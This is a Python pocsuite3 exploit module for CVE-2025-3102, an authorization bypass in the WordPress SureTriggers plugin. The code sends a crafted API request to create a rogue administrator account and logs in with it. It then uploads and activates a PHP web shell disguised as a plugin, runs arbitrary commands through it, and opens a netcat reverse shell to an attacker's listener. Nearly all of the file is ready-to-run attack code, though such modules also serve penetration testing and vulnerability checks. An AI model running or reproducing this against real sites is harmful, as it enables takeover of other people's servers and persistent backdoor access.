from pocsuite3.api import POCBase, register_poc, Output, OptDict, OptString, OrderedDict, REVERSE_PAYLOAD, get_listener_ip, get_listener_port
import requests
import re
import json
from bs4 import BeautifulSoup
import zipfile
import io
import urllib.parse

class CVE20253102POC(POCBase):
    vulID = 'CVE-2025-3102'
    version = '1.0'
    author = ['NPDang', 'TQBao']
    vulDate = '2025-06-30'
    createDate = '2025-07-21'
    updateDate = '2025-07-21'
    references = ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-3102']
    name = 'WordPress SureTriggers Plugin Authorization Bypass Vulnerability CVE-2025-3102'
    appPowerLink = 'https://wordpress.org/plugins/suretriggers/'
    appName = 'WordPress SureTriggers Plugin'
    appVersion = '<= 1.0.78'
    vulType = 'Authorization Bypass to Remote Code Execute'
    category = ''
    desc = '''
        This PoC exploits CVE-2025-3102, an authorization bypass vulnerability in the WordPress SureTriggers plugin (<= 1.0.78).
        It allows creating an administrator user by sending a crafted request to the SureTriggers API endpoint.
    '''
    samples = []

    def _options(self):
        o = OrderedDict()
        o['email'] = OptString('username@gmail.com', description='Email for the new admin user', require=False)
        o['username'] = OptString('username', description='Username for the new admin user', require=False)
        o['password'] = OptString('password', description='Password for the new admin user', require=False)
        o['cmd'] = OptString('whoami', description='Command to execute in the web shell', require=False)
        return o

    def _make_request(self, url, headers, payload, session=None):
        if session is None:
            session = requests
        try:
            response = session.post(url, headers=headers, json=payload, timeout=15, verify=False)
            return response, None
        except requests.exceptions.RequestException as e:
            return None, f"Request failed: {e}"

    def _fetch_plugin_version(self, url, session=None):
        if session is None:
            session = requests
        readme_url = f"{url.rstrip('/')}/wp-content/plugins/suretriggers/readme.txt"
        try:
            response = session.get(readme_url, timeout=10, verify=False)
            if response.status_code == 200:
                match = re.search(r"Stable tag:\s*(\d+\.\d+\.\d+)", response.text)
                if match:
                    return match.group(1)
            return None
        except requests.exceptions.RequestException as e:
            return None

    def _is_version_vulnerable(self, version):
        try:
            version_parts = list(map(int, version.split(".")))
            return version_parts <= [1, 0, 78]
        except (ValueError, TypeError):
            return False

    def _prepare_headers(self):
        return {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "st_authorization": ""
        }

    def _build_payload(self, email, username, password):
        return {
            "integration": "WordPress",
            "type_event": "create_user_if_not_exists",
            "selected_options": {
                "user_email": email,
                "user_name": username,
                "password": password,
                "role": "administrator"
            },
            "fields": [],
            "context": {}
        }

    def _verify(self):
        result = {}
        url = self.url.rstrip('/') + '/index.php/wp-json/sure-triggers/v1/automation/action'
        email = self.get_option('email')
        username = self.get_option('username')
        password = self.get_option('password')

        version = self._fetch_plugin_version(self.url)
        if version:
            if not self._is_version_vulnerable(version):
                result['Error'] = f"Plugin version {version} is not vulnerable (<= 1.0.78 required)"
                return self.parse_output(result)

        headers = self._prepare_headers()
        payload = self._build_payload(email, username, password)
        response, error = self._make_request(url, headers, payload)

        if response is None:
            result['Error'] = error or "Failed to connect to the endpoint"
            return self.parse_output(result)

        try:
            response_data = response.json()
            if response_data.get("success"):
                result['VerifyInfo'] = {
                    'URL': url,
                    'Status': 'Target is vulnerable',
                    'Credentials': f"{username}:{password}"
                }
            else:
                result['Error'] = "Exploit failed. Response indicated failure."
        except json.JSONDecodeError:
            result['Error'] = "Failed to parse JSON response."
        
        return self.parse_output(result)

    def _attack(self):
        result = {}
        base_url = self.url.rstrip('/')
        login_url = f"{base_url}/wp-login.php"
        admin_url = f"{base_url}/wp-admin/"
        upload_url = f"{base_url}/wp-admin/update.php?action=upload-plugin"
        plugins_url = f"{base_url}/wp-admin/plugins.php"
        
        session = requests.Session()
        
        username = self.get_option('username')
        password = self.get_option('password')
        
        exploit_url = f"{base_url}/index.php/wp-json/sure-triggers/v1/automation/action"
        email = self.get_option('email')
        headers = self._prepare_headers()
        payload = self._build_payload(email, username, password)
        response, error = self._make_request(exploit_url, headers, payload, session)
        
        if response is None or not response.json().get("success"):
            result['Error'] = error or "Failed to create admin user"
            return self.parse_output(result)

        try:
            login_page = session.get(login_url, verify=False, timeout=15)
            login_page.raise_for_status()
            soup = BeautifulSoup(login_page.content, 'html.parser')
            nonce = soup.find('input', {'name': '_wpnonce'})
            nonce = nonce['value'] if nonce and 'value' in nonce.attrs else ''
        except requests.exceptions.RequestException as e:
            return self.parse_output({'Error': f"Failed to fetch login page: {e}"})

        login_data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": admin_url,
            "testcookie": "1",
            "_wpnonce": nonce
        }
        try:
            response = session.post(login_url, data=login_data, verify=False, timeout=15, allow_redirects=True)
            response.raise_for_status()
            admin_page = session.get(admin_url, verify=False, timeout=15)
            admin_page.raise_for_status()
            if "wp-admin" not in admin_page.url:
                return self.parse_output({'Error': "Login failed: Redirected to non-admin page"})
        except requests.exceptions.RequestException as e:
            return self.parse_output({'Error': f"Login failed: {e}"})

        plugin_dir = "nxploitplugin"
        webshell_payload = """<?php
    /**
    * Plugin Name: NxploitPlugin
    * Version: 1.0
    * Author: Test
    */
    if(isset($_GET['cmd'])) {
        system($_GET['cmd'] . ' 2>&1');
    }
    ?>"""

        try:
            plugins_page = session.get(plugins_url, verify=False, timeout=15)
            plugins_page.raise_for_status()
            plugins_soup = BeautifulSoup(plugins_page.content, 'html.parser')
            plugin_row = plugins_soup.find('tr', {'data-plugin': f"{plugin_dir}/web_shell.php"})
            if plugin_row and 'inactive' not in plugin_row.get('class', []):
                cmd = self.get_option('cmd')
                cmd_output = None
                if cmd:
                    rce_url = f"{base_url}/wp-content/plugins/{plugin_dir}/web_shell.php?cmd={urllib.parse.quote(cmd)}"
                    try:
                        cmd_response = session.get(rce_url, verify=False, timeout=20)
                        cmd_response.raise_for_status()
                        cmd_output = cmd_response.text.strip().split('\n')[0]
                    except requests.exceptions.RequestException as e:
                        cmd_output = None

                result = {
                    'AttackInfo': {
                        'Web_Shell_URL': f"{base_url}/wp-content/plugins/{plugin_dir}/web_shell.php?cmd={urllib.parse.quote(cmd)}",
                        'Web_Shell_Status': 'Command executed' if cmd_output else 'Command execution failed',
                        'Command_Output': cmd_output
                    }
                }
                return self.parse_output(result)
        except requests.exceptions.RequestException as e:
            return self.parse_output({'Error': f"Failed to check plugins page: {e}"})

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr(f"{plugin_dir}/web_shell.php", webshell_payload)
        zip_buffer.seek(0)

        try:
            upload_page = session.get(f"{base_url}/wp-admin/plugin-install.php?tab=upload", verify=False, timeout=15)
            upload_page.raise_for_status()
            upload_soup = BeautifulSoup(upload_page.content, 'html.parser')
            nonce_input = upload_soup.find('input', {'name': '_wpnonce'})
            if not nonce_input or 'value' not in nonce_input.attrs:
                return self.parse_output({'Error': f"Failed to fetch upload nonce: {upload_page.status_code}"})
            upload_nonce = nonce_input['value']
        except requests.exceptions.RequestException as e:
            return self.parse_output({'Error': f"Failed to fetch plugin upload page: {e}"})

        files = {
            'pluginzip': ("nxploitplugin.zip", zip_buffer, 'application/zip'),
            'install-plugin-submit': (None, 'Install Now')
        }
        upload_data = {
            '_wpnonce': upload_nonce,
            '_wp_http_referer': f"{base_url}/wp-admin/plugin-install.php?tab=upload",
            'install-plugin-submit': 'Install Now'
        }
        try:
            upload_response = session.post(upload_url, files=files, data=upload_data, verify=False, timeout=20)
            upload_response.raise_for_status()
            upload_status = "Success" if 'Plugin installed successfully' in upload_response.text or upload_response.status_code == 200 else "Failed"
            if upload_status == "Failed":
                return self.parse_output({'Error': f"Plugin upload failed: {upload_response.text[:100]}..."})
        except requests.exceptions.RequestException as e:
            return self.parse_output({'Error': f"Plugin upload failed: {e}"})

        activation_status = "Failed"
        try:
            plugins_page = session.get(plugins_url, verify=False, timeout=15)
            plugins_page.raise_for_status()
            plugins_soup = BeautifulSoup(plugins_page.content, 'html.parser')
            plugin_row = plugins_soup.find('tr', {'data-plugin': f"{plugin_dir}/web_shell.php"})
            if plugin_row:
                activate_link = plugin_row.find('a', href=re.compile(r'action=activate'))
                if activate_link and '_wpnonce' in activate_link['href']:
                    nonce_match = re.search(r'_wpnonce=([a-z0-9]+)', activate_link['href'])
                    activate_nonce = nonce_match.group(1) if nonce_match else None
                    if activate_nonce:
                        encoded_plugin_path = urllib.parse.quote(f"{plugin_dir}/web_shell.php")
                        activate_url = f"{base_url}/wp-admin/plugins.php?action=activate&plugin={encoded_plugin_path}&_wpnonce={activate_nonce}"
                        activate_response = session.get(activate_url, verify=False, timeout=20, allow_redirects=True)
                        
                        if activate_response.status_code in (200, 302):
                            plugins_page_after = session.get(plugins_url, verify=False, timeout=15)
                            plugins_page_after.raise_for_status()
                            plugins_soup_after = BeautifulSoup(plugins_page_after.content, 'html.parser')
                            plugin_row_after = plugins_soup_after.find('tr', {'data-plugin': f"{plugin_dir}/web_shell.php"})
                            if plugin_row_after and 'inactive' not in plugin_row_after.get('class', []):
                                activation_status = "Success"
                            else:
                                activation_status = f"Failed: Plugin not active - {activate_response.text[:100]}"
                        else:
                            activation_status = f"Failed: HTTP status {activate_response.status_code} - {activate_response.text[:100]}"
                    else:
                        activation_status = "Failed: Could not extract activation nonce"
                else:
                    activation_status = "Failed: Could not find activation link"
            else:
                activation_status = "Failed: Could not find plugin row"
        except requests.exceptions.RequestException as e:
            activation_status = f"Failed: Error fetching plugins page - {str(e)}"
        except Exception as e:
            activation_status = f"Failed: Unexpected error - {str(e)}"

        cmd = self.get_option('cmd')
        cmd_output = None
        if cmd and activation_status == "Success":
            rce_url = f"{base_url}/wp-content/plugins/{plugin_dir}/web_shell.php?cmd={urllib.parse.quote(cmd)}"
            try:
                cmd_response = session.get(rce_url, verify=False, timeout=20)
                cmd_response.raise_for_status()
                cmd_output = cmd_response.text.strip().split('\n')[0]
            except requests.exceptions.RequestException as e:
                cmd_output = None

        result = {
            'AttackInfo': {
                'Upload_Status': upload_status,
                'Activation_Status': activation_status,
                'Web_Shell_URL': f"{base_url}/wp-content/plugins/{plugin_dir}/web_shell.php?cmd={urllib.parse.quote(cmd)}" if cmd else None,
                'Web_Shell_Status': 'Command executed' if cmd_output else 'Command execution failed',
                'Command_Output': cmd_output
            }
        }
        return self.parse_output(result)

    def _shell(self):
            result = {}
            web_shell_url = self.url.rstrip('/') + '/wp-content/plugins/nxploitplugin/web_shell.php'
            
            cmd = REVERSE_PAYLOAD.NC.format(get_listener_ip(), get_listener_port())
            encoded_payload = urllib.parse.quote(cmd)
            
            try:
                rce_url = f"{web_shell_url}?cmd={encoded_payload}"
                response = requests.get(rce_url, verify=False, timeout=20)
                response.raise_for_status()
                
                result['ShellInfo'] = {
                    'Web_Shell_URL': rce_url,
                    'Status': 'Reverse shell executed successfully',
                    'Listener': f"{get_listener_ip()}:{get_listener_port()}"
                }
            except requests.exceptions.RequestException as e:
                result['Error'] = f"Reverse shell execution "
            return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result.get('VerifyInfo') or result.get('AttackInfo'):
            output.success(result)
        else:
            output.fail(result.get('Error') or 'Target is not vulnerable')
        return output

register_poc(CVE20253102POC)
